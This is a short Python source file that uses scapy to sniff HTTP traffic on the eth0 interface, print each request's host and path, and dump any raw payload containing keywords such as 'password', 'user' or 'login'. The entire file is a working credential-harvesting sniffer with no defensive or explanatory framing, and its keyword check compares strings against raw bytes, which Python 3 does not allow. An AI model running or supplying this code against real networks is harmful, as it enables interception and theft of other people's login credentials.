'''
Created on 24 Aug 2021

@author: adam
'''

 
import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_packets)
    
def process_packets(packet):
    if packet.haslayer(http.HTTPRequest):
        print("[+] Http Request >> " + packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path)
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            keys = ["Password","password", "User", "user", "Username", "username", "login", "pass"]
            
            for key in keys:
                if key in load:
                    print(load)
                    break
        
sniff("eth0")